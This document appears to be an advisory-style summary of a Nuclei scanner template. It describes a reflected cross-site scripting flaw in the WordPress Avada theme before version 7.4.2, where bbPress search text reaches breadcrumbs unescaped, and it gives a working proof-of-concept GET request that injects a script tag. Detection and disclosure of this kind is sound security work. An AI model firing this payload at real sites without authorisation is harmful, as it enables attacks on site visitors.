# Nuclei Template: WordPress Avada Website Builder <7.4.2 - Cross-Site Scripting
**Template ID:** avada-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** High
**CWE:** CWE-80
**Source:** Nuclei Template (`avada-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Avada Website Builder prior to 7.4.2 contains a cross-site scripting vulnerability. The theme does not properly escape bbPress searches before outputting them back as breadcrumbs.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/forums/search/z-->%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/
```

## References
- https://wpscan.com/vulnerability/eb172b07-56ab-41ce-92a1-be38bab567cb
- https://theme-fusion.com/documentation/avada/installation-maintenance/avada-changelog/
